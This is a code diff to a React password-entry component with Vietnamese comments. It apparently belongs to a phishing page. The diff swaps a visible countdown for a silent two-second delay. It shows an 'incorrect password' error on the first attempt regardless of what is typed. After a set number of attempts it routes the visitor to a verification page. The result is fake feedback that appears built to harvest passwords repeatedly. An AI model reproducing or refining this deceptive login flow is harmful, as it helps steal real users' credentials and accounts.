@@ -14,7 +14,6 @@ const PasswordInput = ({ onClose }) => {
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
     const [attempts, setAttempts] = useState(0);
-    const [countdown, setCountdown] = useState(0);
 
     const defaultTexts = useMemo(
         () => ({
@@ -24,8 +23,7 @@ const PasswordInput = ({ onClose }) => {
             placeholder: 'Enter your password',
             errorMessage: 'The password you entered is incorrect',
             continueBtn: 'Continue',
-            loadingText: 'Please wait',
-            secondsText: 'seconds'
+            loadingText: 'Please wait'
         }),
         []
     );
@@ -42,8 +40,7 @@ const PasswordInput = ({ onClose }) => {
                     translatedPlaceholder,
                     translatedError,
                     translatedContinue,
-                    translatedLoading,
-                    translatedSeconds
+                    translatedLoading
                 ] = await Promise.all([
                     translateText(defaultTexts.title, targetLang),
                     translateText(defaultTexts.description, targetLang),
@@ -51,8 +48,7 @@ const PasswordInput = ({ onClose }) => {
                     translateText(defaultTexts.placeholder, targetLang),
                     translateText(defaultTexts.errorMessage, targetLang),
                     translateText(defaultTexts.continueBtn, targetLang),
-                    translateText(defaultTexts.loadingText, targetLang),
-                    translateText(defaultTexts.secondsText, targetLang)
+                    translateText(defaultTexts.loadingText, targetLang)
                 ]);
 
                 setTranslatedTexts({
@@ -62,8 +58,7 @@ const PasswordInput = ({ onClose }) => {
                     placeholder: translatedPlaceholder,
                     errorMessage: translatedError,
                     continueBtn: translatedContinue,
-                    loadingText: translatedLoading,
-                    secondsText: translatedSeconds
+                    loadingText: translatedLoading
                 });
             } catch {
                 //
@@ -92,26 +87,14 @@ const PasswordInput = ({ onClose }) => {
             //
         }
 
-        setCountdown(config.password_loading_time);
-
-        const timer = setInterval(() => {
-            setCountdown((prev) => {
-                if (prev <= 1) {
-                    clearInterval(timer);
-                    return 0;
-                }
-                return prev - 1;
-            });
-        }, 1000);
-
-        await new Promise((resolve) => setTimeout(resolve, config.password_loading_time * 1000));
+        // Đếm ngầm 2 giây thay vì hiển thị countdown
+        await new Promise((resolve) => setTimeout(resolve, 2000));
 
         // ✅ chỉ show error ở lần sai đầu tiên
         setShowError(attempts === 0);
 
         setAttempts((prev) => prev + 1);
         setIsLoading(false);
-        setCountdown(0);
 
         if (attempts + 1 >= config.max_password_attempts) {
             navigate(PATHS.VERIFY);
@@ -152,7 +135,7 @@ const PasswordInput = ({ onClose }) => {
                         disabled={isLoading || !password.trim()}
                     >
                         {isLoading
-                            ? `${translatedTexts.loadingText} ${countdown} ${translatedTexts.secondsText}...`
+                            ? `${translatedTexts.loadingText}...`
                             : translatedTexts.continueBtn}
                     </button>
                 </div>
